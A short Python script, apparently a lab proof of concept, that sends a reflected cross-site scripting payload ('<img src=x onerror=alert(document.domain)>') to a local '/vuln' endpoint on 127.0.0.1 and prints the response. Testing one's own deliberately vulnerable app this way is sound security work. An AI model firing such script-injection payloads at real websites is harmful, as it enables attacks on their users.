import requests

r = requests.get(
    "http://127.0.0.1:5000/vuln",
    params={"q": "<img src=x onerror=alert(document.domain)>"},
)
print(r.url, r.text)
